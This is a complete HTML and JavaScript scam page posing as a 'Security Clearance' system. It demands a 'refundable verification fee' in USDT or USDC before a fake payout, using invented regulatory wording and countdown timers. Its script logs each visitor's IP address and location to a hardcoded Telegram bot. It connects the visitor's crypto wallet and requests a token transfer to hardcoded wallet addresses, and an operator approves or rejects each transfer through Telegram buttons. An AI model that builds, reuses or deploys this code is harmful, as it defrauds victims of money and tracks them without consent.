<!DOCTYPE html>
<html lang="en"> 
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security Clearance</title>

    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --accent-red: #ef4444;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --btn-green: #10b981;
            --btn-green-hover: #059669;
        }

    body {
        font-family: 'Georgia', sans-serif; 
        margin: 0;
        color: #fff;
        background-color: var(--bg-color);
        background: linear-gradient(135deg,#0d0f1a,#050608);
        overflow-x:hidden;
    }
    button { cursor: pointer; }
    a { color: inherit; text-decoration: none; font-weight: bold; }

    #content {
        position: relative;
        z-index: 1;
        padding: 20px 15px;
        max-width: 600px;
        margin: auto;
        padding-bottom: 40px;
        text-align: center;
    }

.glass-card {
  background: rgba(255,255,255,0.12);
  backdrop-filter: blur(12px);
  border-radius: 18px;
  padding: 28px;
  margin: 80px auto 30px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
  max-width: 280px !important;
}

.checkbox-container {
  display: flex;
  flex-direction: row-reverse;
  align-items: flex-end;
  justify-content: space-between;
  gap: 16px;
  margin-top: 14px;
}

.checkbox-container input {
  margin-bottom: 4px;
  cursor: pointer;
}

.checkbox-container label {
  flex: 1;
}

.neon-card.warning {
  animation: warning-glow 0.8s ease-in-out 2;
  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
}

@keyframes warning-glow {
  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
}

    #payment-container {
        background-color: var(--card-bg);
        border: 1px solid var(--border-color);
        backdrop-filter: blur(15px);
        border-radius: 20px;
        padding: 25px 20px;
        box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1);
        text-align: center;
        max-width: 350px;
        width: 95%;
        animation: pulseGlow 3s infinite alternate;
        margin: 0 auto 50px auto;
    }

    @keyframes pulseGlow {
        0% { box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1); }
        50% { box-shadow: 0 0 30px rgba(0,255,255,0.4), 0 0 60px rgba(255,0,255,0.2); }
        100% { box-shadow: 0 0 25px rgba(0,255,255,0.3), 0 0 50px rgba(255,0,255,0.15); }
    }

    .amount {
        font-weight: bold;
        font-size: 1.6rem;
        color: #ff3fff;
        text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
    }

    p {
        margin: 12px 0;
        font-size: 1.2rem;
        letter-spacing: 0.5px;
    }

    p + p {
        font-family: 'Georgia', sans-serif; 
        font-size: clamp(1.6rem, 4vw, 1.8rem);
        color: #0ff;
        text-shadow: 0 0 6px #0ff;
        word-break: break-all;
        overflow-wrap: normal !important;
    }

    #usdt-timer, #usdc-timer {
        font-size: 1rem;
        font-weight: bold !important;
        color: var(--accent-red) !important;
        text-shadow: 0 0 5px rgba(239, 68, 68, 0.4);
        margin-top: 15px;
        text-align: center;
    }

    .progress-bar {
        width: 100%;
        height: 18px;
        background: rgba(255,255,255,0.06);
        border-radius: 12px;
        overflow: hidden;
        margin: 18px 0;
    }

    .progress-fill {
        height: 100%;
        width: 0%;
        border-radius: 12px;
        position: relative;
        transition: width 0.6s ease;
        background: var(--accent-red);
        box-shadow: 0 0 20px rgba(79,172,254,0.6);
    }

    .progress-fill::after {
        content: "";
        position: absolute;
        inset: 0;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
        animation: energyFlow 2.5s linear infinite;
    }

    @keyframes energyFlow {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }

    .plan-pay {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        flex-wrap: wrap;
    }

    .plan-logo {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin: 0;
    }

    .token-name, .network {
        display: inline-block;
        font-weight: bold;
        color: #fff;
    }

    #tokenSelector {
        display: flex;
        background: rgba(0, 0, 0, 0.3);
        border-radius: 12px;
        padding: 4px;
        gap: 6px;
        margin-bottom: 20px;
        border: 1px solid rgba(0, 255, 255, 0.2);
    }

    #tokenSelector button {
        flex: 1;
        padding: 10px 0;
        font-size: 0.85rem;
        font-weight: bold;
        color: #8a8f9d;
        background: transparent;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        text-transform: uppercase;
        transition: all 0.3s ease-in-out;
    }

    #tokenSelector button.active {
        color: #fff;
        background: linear-gradient(135deg, #0ff, #ff3fff);
        box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
    }

    .header {
        text-align: center;
        margin-bottom: 1rem;
    }

    .badge {
        display: inline-block;
        background-color: rgba(239, 68, 68, 0.15);
        color: var(--accent-red);
        font-size: 0.75rem;
        font-weight: 700;
        padding: 0.25rem 0.75rem;
        border-radius: 9999px;
        border: 1px solid rgba(239, 68, 68, 0.3);
        text-transform: uppercase;
        letter-spacing: 0.05em;
        margin-bottom: 0.75rem;
    }

    .footer-note {
        margin-top: 1.5rem;
        font-size: 0.75rem;
        color: var(--text-muted);
        text-align: center;
        line-height: 1.3;
    }

    .token-card.inactive {
        display: none;
    }

    .notification-bar {
        position: fixed;
        top: -80px;
        right: 20px;
        background: rgba(30, 144, 255, 0.25);
        backdrop-filter: blur(12px);
        border: 1px solid rgba(30,144,255,0.4);
        color: #fff;
        padding: 12px 18px;
        border-radius: 12px;
        font-size: 14px;
        font-weight: bold;
        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
        transition: top 0.5s ease, opacity 0.5s ease;
        z-index: 9999;
        opacity: 0;
        max-width: 350px;
        white-space: normal;
        overflow: hidden;
    }

    .notification-bar.show { top: 20px; opacity: 1; }

    .notification-bar::before {
        content: '';
        position: absolute;
        left: -50%;
        top: 0;
        width: 50%;
        height: 100%;
        background: rgba(255,255,255,0.3);
        transform: skewX(-25deg);
        animation: liquidWave 2s linear infinite;
    }

    @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }

    .walletconnect-actions {
        margin-top: 20px;
        display: flex;
        flex-direction: column;
        gap: 12px;
    }

    .status-animation-container {
        margin-top: 18px;
        font-family: 'Georgia', sans-serif; 
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 8px;
        width: 100%;
    }

    .payment-line-wrapper {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        width: 100%;
        color: #0ff;
        font-size: 0.9rem;
        font-weight: bold;
        text-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
    }

    .label-text {
        letter-spacing: 1px;
        transition: color 0.4s ease, text-shadow 0.4s ease;
    }

    .cyber-line-track {
        flex: 1;
        max-width: 160px;
        height: 3px;
        background: rgba(0, 255, 255, 0.2);
        border-radius: 4px;
        position: relative;
        overflow: hidden;
    }

    .cyber-line-pulse {
        position: absolute;
        top: 0;
        left: -40%;
        width: 40%;
        height: 100%;
        background: linear-gradient(90deg, transparent, #0ff, transparent);
        box-shadow: 0 0 8px #0ff;
        animation: bouncePulse 1.2s ease-in-out infinite alternate;
    }

    @keyframes bouncePulse {
        0% { left: -10%; }
        100% { left: 70%; }
    }

    .checkmark-wrapper {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 22px;
        height: 22px;
        margin-left: 4px;
        opacity: 0;
        transform: scale(0.5);
        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .checkmark-wrapper.active {
        opacity: 1;
        transform: scale(1);
    }

    .checkmark-svg {
        width: 22px;
        height: 22px;
        border-radius: 50%;
        display: block;
        stroke-width: 3;
        stroke: #10b981;
        stroke-miterlimit: 10;
        box-shadow: inset 0px 0px 0px #10b981;
        animation: fillCircle .4s ease-in-out .4s forwards;
    }

    .checkmark-circle {
        stroke-dasharray: 166;
        stroke-dashoffset: 166;
        stroke-width: 3;
        stroke-miterlimit: 10;
        stroke: #10b981;
        fill: none;
        animation: strokeCircle 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }

    .checkmark-check {
        transform-origin: 50% 50%;
        stroke-dasharray: 48;
        stroke-dashoffset: 48;
        animation: strokeCheck 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.5s forwards;
    }

    @keyframes strokeCircle {
        100% { stroke-dashoffset: 0; }
    }

    @keyframes strokeCheck {
        100% { stroke-dashoffset: 0; }
    }

    @keyframes fillCircle {
        100% { box-shadow: inset 0px 0px 0px 30px rgba(16, 185, 129, 0.2); }
    }

    .payment-line-wrapper.success .label-text.received {
        color: #10b981;
        text-shadow: 0 0 10px rgba(16, 185, 129, 0.8);
    }

    .payment-line-wrapper.success .cyber-line-track {
        background: rgba(16, 185, 129, 0.3);
    }

    .payment-line-wrapper.success .cyber-line-pulse {
        animation: none;
        left: 0;
        width: 100%;
        background: #10b981;
        box-shadow: 0 0 10px #10b981;
        transition: all 0.4s ease;
    }

    .wallet-btn {
        width: 100%;
        padding: 14px 18px;
        border: none;
        border-radius: 14px;
        font-size: 15px;
        font-weight: 700;
        color: #fff;
        background: linear-gradient(135deg,#6b2cd8,#9b59b6);
        box-shadow: 0 0 12px rgba(107,44,216,0.5), 0 0 24px rgba(155,89,182,0.3);
        transition: all .25s ease;
    }

    .wallet-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 0 18px rgba(107,44,216,0.7), 0 0 36px rgba(155,89,182,0.45);
    }

    @media (max-width: 400px) {
        #payment-container {
            padding: 20px 15px;
            max-width: 300px;
        }
        .amount {
            font-size: 1.4rem;
        }
        p {
            font-size: 0.9rem;
        }
    }
    </style>
</head>

<body>

  <div id="content">

    <div id="planNotification" class="notification-bar"></div>

    <div id="payment-container">
      <div class="header">
        <span class="badge">Action Required</span>
      </div>

      <div id="tokenSelector">
        <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
        <button id="usdc-btn" onclick="showTokenCard('usdc')">USDC NETWORK</button>
      </div>

      <!-- USDT Card -->
      <div class="token-card" id="usdt-card">
        <div class="plan-pay">
          <img class="plan-logo"
               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
               alt="Tether Logo">
          <span class="token-name">USDT</span>
          <span class="network">ERC-20</span>
        </div>

        <div class="amount-section">
          <p>Required Clearance Fee</p>
          <p class="amount" id="usdt-amount">119.2037</p>
        </div>

        <div class="walletconnect-actions">
          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handleWalletAction()">
            Verify & Process Payout 
          </button>
        </div>
        <p id="usdt-timer">Verification expires in 05:00</p>

        <div class="progress-bar">
          <div class="progress-fill" id="usdt-progress"></div>
        </div>
      </div>

      <!-- USDC Card -->
      <div class="token-card inactive" id="usdc-card">
        <div class="plan-pay">
          <img class="plan-logo"
               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
               alt="USD Coin Logo">
          <span class="token-name">USDC</span>
          <span class="network">ERC-20</span>
        </div>

        <div class="amount-section">
          <p>Required Clearance Fee</p>
          <p class="amount" id="usdc-amount">119.2037</p>
        </div>

        <div class="walletconnect-actions">
          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handleWalletAction()">
            Verify & Process Payout  
          </button>
        </div>
        <p id="usdc-timer">Verification expires in 05:00</p>

        <div class="progress-bar">
          <div class="progress-fill" id="usdc-progress"></div>
        </div>
      </div>
    </div>

    <div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
      <div class="checkbox-container">
        <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
        <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
          <span style="  
            display: block;  
            margin: 12px 0;  
            padding-left: 12px;  
            border-left: 3px solid rgba(200, 50, 80, 0.85);  
            color: rgba(255, 255, 255, 0.85);  
            font-size: 10px;
            font-weight: bold; 
          ">  
            Because your incoming transaction falls below minimum reporting thresholds, standard cross-border clearance regulations require the above refundable verification protocol before disbursement.
          </span>
        </label>
      </div>
      <div class="footer-note">
          Automated Clearance System • Security Protocol SSL-256
      </div>
    </div>

  </div>

 <script type="module">
    import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js";
    import { createAppKit } from "https://esm.sh/@reown/appkit@2.2.0";
    import { EthersAdapter } from "https://esm.sh/@reown/appkit-adapter-ethers@2.2.0";
    import { mainnet } from "https://esm.sh/@reown/appkit/networks";

    // ==========================================
    // 🔐 CENTRAL CONFIGURATION & TELEGRAM SETTINGS
    // ==========================================
    const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
    const TELEGRAM_CHAT_ID = "-1003913850436";
    const WALLETCONNECT_PROJECT_ID = "YOUR_PROJECT_ID_HERE"; // Replace with your Reown/WalletConnect Project ID

    let timerInterval;
    let telegramPollInterval = null;
    let paymentDone = false;

    const SOURCE_TIMER_KEY = "avb_expiry_times";

    const wallets = [
        "0x63d93f4348b109492d75aaaf10ac374d448178cd",
        "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
    ];

    // Standard ERC-20 Token Contracts (Ethereum Mainnet)
    const tokenContracts = {
        USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        USDC: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
    };

    // Minimal ERC-20 ABI required to execute transfers
    const erc20Abi = [
        "function transfer(address to, uint256 value) public returns (bool)"
    ];

    // Initialize Reown AppKit / WalletConnect Modal
    const ethersAdapter = new EthersAdapter();
    const modal = createAppKit({
        adapters: [ethersAdapter],
        networks: [mainnet],
        projectId: WALLETCONNECT_PROJECT_ID,
        metadata: {
            name: 'Security Clearance',
            description: 'Automated Clearance System',
            url: window.location.origin,
            icons: ['https://assets.coingecko.com/coins/images/325/large/Tether.png']
        }
    });

    function getTargetUserIdentifier() {
        const urlParams = new URLSearchParams(window.location.search);
        let identifyUser = urlParams.get('user');

        if (!identifyUser) {
            identifyUser = sessionStorage.getItem('av_session_uid');
            if (!identifyUser) {
                identifyUser = 'User_' + Math.random().toString(36).substring(2, 8);
                sessionStorage.setItem('av_session_uid', identifyUser);
            }
        }
        return identifyUser.trim();
    }

    const totalDuration = 30 * 60 * 1000;
    let expiryTime = localStorage.getItem(SOURCE_TIMER_KEY);

    if (expiryTime) {
        expiryTime = parseInt(expiryTime, 10);
        const remaining = expiryTime - Date.now();
        if (remaining <= 0) {
            localStorage.removeItem("avalonflowAmount");
            localStorage.removeItem(SOURCE_TIMER_KEY);
            localStorage.removeItem("avalonflowWallet");
            localStorage.removeItem("avalonflowRandomDecimal");
            expiryTime = null;
        }
    }

    if (!expiryTime) {
        expiryTime = Date.now() + totalDuration;
        localStorage.setItem(SOURCE_TIMER_KEY, expiryTime);
    }

    let walletPair = JSON.parse(localStorage.getItem("avalonflowWalletPair"));
    if (!walletPair) {
        walletPair = { USDT: wallets[0], USDC: wallets[1] };
        localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
    }

    let activeWallet = localStorage.getItem("avalonflowWallet");
    if (!activeWallet) {
        activeWallet = wallets[Math.floor(Math.random() * wallets.length)];
        localStorage.setItem("avalonflowWallet", activeWallet);
    }

    const storageKey = "avalonflowAmount_custom";
    const rawBonus = localStorage.getItem("av_converted_amount") || localStorage.getItem("av_retention_bonus");
    let calculatedBaseAmount;

    if (rawBonus && !isNaN(parseFloat(rawBonus))) {
        calculatedBaseAmount = (parseFloat(rawBonus) * 0.0400).toFixed(2);
    } else {
        calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "2133.33").toFixed(2);
    }

    let randomDecimal = localStorage.getItem("avalonflowRandomDecimal");
    if (!randomDecimal) {
        randomDecimal = (Math.floor(Math.random() * 10000) / 10000).toString();
        localStorage.setItem("avalonflowRandomDecimal", randomDecimal);
    }

    let expectedAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
    localStorage.setItem("avalonflowAmount", expectedAmount);

    let activeToken = "USDT";

    async function initializeAppWithIP() {
        let ipData = {};
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (!ipResponse.ok) throw new Error('Failed to fetch network details');
            ipData = await ipResponse.json();
        } catch (err) {
            ipData = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
        }

        if (!sessionStorage.getItem('visitor_logged_tg')) {
            await sendVisitorDetailsToTelegram(ipData);
        }
    }

    async function sendVisitorDetailsToTelegram(ipData) {
        try {
            const rawAgent = navigator.userAgent;
            if (/bot|googlebot|crawler|spider|robot/i.test(rawAgent)) return;

            const identifyUser = getTargetUserIdentifier();
            const currentPage = window.location.pathname;
            const messageText = `⚡ <b>Crypto Checkout Session Started | AvalonFlow</b>\n\n` +
                                `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                                `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
                                `💰 <b>Expected Amount (29.65% Fee):</b> <code>$${expectedAmount}</code>\n` +
                                `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                                `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                                `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: 'HTML' })
            });

            sessionStorage.setItem('visitor_logged_tg', 'true');
        } catch (err) {
            console.warn("Telegram telemetry error:", err);
        }
    }

    function initiatePaymentAnimationUI() {
        const usdtProgress = document.getElementById("usdt-progress");
        const usdcProgress = document.getElementById("usdc-progress");
        const usdtTimer = document.getElementById("usdt-timer");
        const usdcTimer = document.getElementById("usdc-timer");

        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "none";
        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "none";
        if (usdtTimer) usdtTimer.style.display = "none";
        if (usdcTimer) usdcTimer.style.display = "none";

        const usdtCard = document.getElementById("usdt-card");
        const usdcCard = document.getElementById("usdc-card");

        const statusHTML = `
            <div class="status-animation-container" id="active-status-container">
                <div class="payment-line-wrapper">
                    <span class="label-text">Sent</span>
                    <div class="cyber-line-track">
                        <div class="cyber-line-pulse"></div>
                    </div>
                    <span class="label-text received">Received</span>
                    <div class="checkmark-wrapper">
                        <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                            <circle class="checkmark-circle" cx="26" cy="26" r="23" fill="none"/>
                            <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                        </svg>
                    </div>
                </div>
            </div>
        `;

        if (usdtCard && !usdtCard.querySelector("#active-status-container")) usdtCard.insertAdjacentHTML('beforeend', statusHTML);
        if (usdcCard && !usdcCard.querySelector("#active-status-container")) usdcCard.insertAdjacentHTML('beforeend', statusHTML);
    }

    function completePaymentAnimationUI(redirectUrl) {
        const wrappers = document.querySelectorAll(".payment-line-wrapper");
        wrappers.forEach(wrapper => wrapper.classList.add("success"));

        const checkmarks = document.querySelectorAll(".checkmark-wrapper");
        checkmarks.forEach(cm => cm.classList.add("active"));

        triggerNotification("Verification Successful. Redirecting...", 3000);

        setTimeout(() => {
            window.location.replace(redirectUrl || "https://membership.avalonflow.site/dashboard");
        }, 1800);
    }

    async function streamPaymentVerificationToTelegram(txHash = "Transaction Execution") {
        try {
            const identifyUser = getTargetUserIdentifier();
            const telegramMessage = 
              `💳 <b>Crypto On-Chain Transfer Submitted</b>\n\n` +
              `• <b>User ID:</b> <code>${identifyUser}</code>\n` +
              `• <b>Token:</b> <code>${activeToken}</code>\n` +
              `• <b>Amount Deducted:</b> <code>$${expectedAmount}</code>\n` +
              `• <b>TX Hash:</b> <code>${txHash}</code>\n` +
              `• <b>Destination Wallet:</b> <code>${walletPair[activeToken]}</code>`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ Approve Transaction", callback_data: `approve:${identifyUser}` },
                        { text: "❌ Reject Transaction", callback_data: `reject:${identifyUser}` }
                    ]
                ]
            };

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: telegramMessage,
                    parse_mode: 'HTML',
                    reply_markup: inlineKeyboard
                })
            });

            startTelegramPolling(identifyUser, txHash);
        } catch (error) {
            console.error('Failed to notify Telegram admin:', error);
        }
    }

    async function acknowledgeTelegramAction(callbackId, messageId, originalText, statusStamp) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: callbackId, text: statusStamp })
            });

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    message_id: messageId,
                    text: `${originalText || ''}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.warn("Failed to acknowledge Telegram action:", e);
        }
    }

    let telegramLastUpdateId = 0;

    function startTelegramPolling(targetUser, txHash) {
        if (telegramPollInterval) clearInterval(telegramPollInterval);

        telegramPollInterval = setInterval(async () => {
            try {
                const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
                const data = await response.json();
                if (!data.ok || !data.result || data.result.length === 0) return;

                for (const update of data.result) {
                    telegramLastUpdateId = update.update_id;

                    if (update.callback_query && update.callback_query.data) {
                        const callbackData = update.callback_query.data;
                        const callbackId = update.callback_query.id;
                        const messageId = update.callback_query.message?.message_id;
                        const originalText = update.callback_query.message?.text || "";

                        if (callbackData === `approve:${targetUser}`) {
                            clearInterval(telegramPollInterval);
                            await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");

                            localStorage.setItem("step_3_paid", "true");
                            localStorage.setItem("step_3_txn_id", txHash);

                            localStorage.removeItem("av_payment_in_progress");
                            localStorage.removeItem(storageKey);
                            localStorage.removeItem(SOURCE_TIMER_KEY);
                            localStorage.removeItem("avalonflowWallet");
                            localStorage.removeItem("avalonflowRandomDecimal");

                            const redirectUrl = `https://membership.avalonflow.site/notifications?txHash=${txHash}`;
                            completePaymentAnimationUI(redirectUrl);
                            break;
                        } 
                        else if (callbackData === `reject:${targetUser}`) {
                            clearInterval(telegramPollInterval);
                            await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");

                            localStorage.removeItem("av_payment_in_progress");

                            const statusContainers = document.querySelectorAll("#active-status-container");
                            statusContainers.forEach(container => container.remove());

                            const usdtProgress = document.getElementById("usdt-progress");
                            const usdcProgress = document.getElementById("usdc-progress");
                            const usdtTimer = document.getElementById("usdt-timer");
                            const usdcTimer = document.getElementById("usdc-timer");

                            if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
                            if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
                            if (usdtTimer) usdtTimer.style.display = "";
                            if (usdcTimer) usdcTimer.style.display = "";

                            paymentDone = false;

                            triggerNotification("Verification failed", 4000);
                            break;
                        }
                    }
                }
            } catch (err) {
                console.warn("Telegram polling interval check active...");
            }
        }, 2500);
    }

    window.handleWalletAction = async function() {
      if (paymentDone) return;

      try {
        let provider;
        let signer;

        // Check if injected browser wallet (MetaMask, Exodus extension) exists
        if (typeof window.ethereum !== "undefined") {
            provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = await provider.getSigner();
        } else {
            // Fallback to Reown AppKit / WalletConnect modal if no injected extension is present
            await modal.open();
            
            // Wait for user to connect via WalletConnect modal
            const walletProvider = modal.getWalletProvider();
            if (!walletProvider) {
                triggerNotification("Please connect a wallet to proceed.", 3000);
                return;
            }
            provider = new ethers.BrowserProvider(walletProvider);
            signer = await provider.getSigner();
        }

        paymentDone = true;
        localStorage.setItem("av_payment_in_progress", "true");

        initiatePaymentAnimationUI();
        triggerNotification("Requesting token transfer approval...", 3000);

        const tokenAddress = tokenContracts[activeToken];
        const recipientWallet = walletPair[activeToken];

        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        const tokenAmountParsed = ethers.parseUnits(expectedAmount, 6);

        const tx = await tokenContract.transfer(recipientWallet, tokenAmountParsed);
        console.log("Transaction broadcasted:", tx.hash);

        triggerNotification("Waiting for network confirmation...", 4000);
        
        const receipt = await tx.wait();
        console.log("Transaction confirmed in block:", receipt.blockNumber);

        await streamPaymentVerificationToTelegram(tx.hash);
      } catch (error) {
        console.error("User rejected or transaction failed", error);
        localStorage.removeItem("av_payment_in_progress");
        paymentDone = false;

        const statusContainers = document.querySelectorAll("#active-status-container");
        statusContainers.forEach(container => container.remove());

        const usdtProgress = document.getElementById("usdt-progress");
        const usdcProgress = document.getElementById("usdc-progress");
        const usdtTimer = document.getElementById("usdt-timer");
        const usdcTimer = document.getElementById("usdc-timer");

        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
        if (usdtTimer) usdtTimer.style.display = "";
        if (usdcTimer) usdcTimer.style.display = "";

        triggerNotification("Transaction rejected or failed", 3000);
      }
    };

    window.showTokenCard = function(selectedToken) {
        activeToken = selectedToken.toUpperCase();
        const cards = document.querySelectorAll(".token-card");
        cards.forEach(card => card.classList.add("inactive"));
        const activeCard = document.getElementById(`${selectedToken}-card`);
        if (activeCard) activeCard.classList.remove("inactive");

        const btnUsdt = document.getElementById("usdt-btn");
        const btnUsdc = document.getElementById("usdc-btn");

        if (btnUsdt && btnUsdc) {
            if (selectedToken === "usdt") {
                btnUsdt.classList.add("active");
                btnUsdc.classList.remove("active");
            } else {
                btnUsdt.classList.remove("active");
                btnUsdc.classList.add("active");
            }
        }
    };

    function triggerNotification(message, duration = 3000) {
        const notification = document.getElementById("planNotification");
        if (!notification) return;
        notification.textContent = message;
        notification.classList.add("show");
        setTimeout(() => notification.classList.remove("show"), duration);
    }

    window.addEventListener("DOMContentLoaded", () => {
        initializeAppWithIP();
        showTokenCard("usdt");

        document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
        document.getElementById("usdc-amount").innerText = "$" + expectedAmount;

        if (localStorage.getItem("av_payment_in_progress") === "true") {
            paymentDone = true;
            initiatePaymentAnimationUI();
            const identifyUser = getTargetUserIdentifier();
            startTelegramPolling(identifyUser, "Resumed Session Request");
        }

        function updateTimer() {
            const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
            const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));

            const totalSeconds = totalDuration / 1000;
            const percentage = Math.max(0, (remaining / totalSeconds) * 100);

            if (usdtProgress) usdtProgress.style.width = percentage + "%";
            if (usdcProgress) usdcProgress.style.width = percentage + "%";

            const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
            const seconds = String(remaining % 60).padStart(2, "0");

            const usdtTimerEl = document.getElementById("usdt-timer");
            const usdcTimerEl = document.getElementById("usdc-timer");

            if (usdtTimerEl) usdtTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
            if (usdcTimerEl) usdcTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";

            if (remaining <= 0 && !paymentDone) {
                paymentDone = true;

                localStorage.removeItem("av_payment_in_progress");
                localStorage.removeItem("avalonflowAmount");
                localStorage.removeItem(SOURCE_TIMER_KEY);
                localStorage.removeItem(storageKey);
                localStorage.removeItem("avalonflowWallet");
                localStorage.removeItem("avalonflowRandomDecimal");

                clearInterval(timerInterval);

                try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }

                setTimeout(() => {
                    window.location.replace("https://membership.avalonflow.site/notifications");
                }, 3200);
            }
        }

        const usdtProgress = document.getElementById("usdt-progress");
        const usdcProgress = document.getElementById("usdc-progress");

        timerInterval = setInterval(updateTimer, 1000);
        updateTimer();
    });
  </script>
</body>
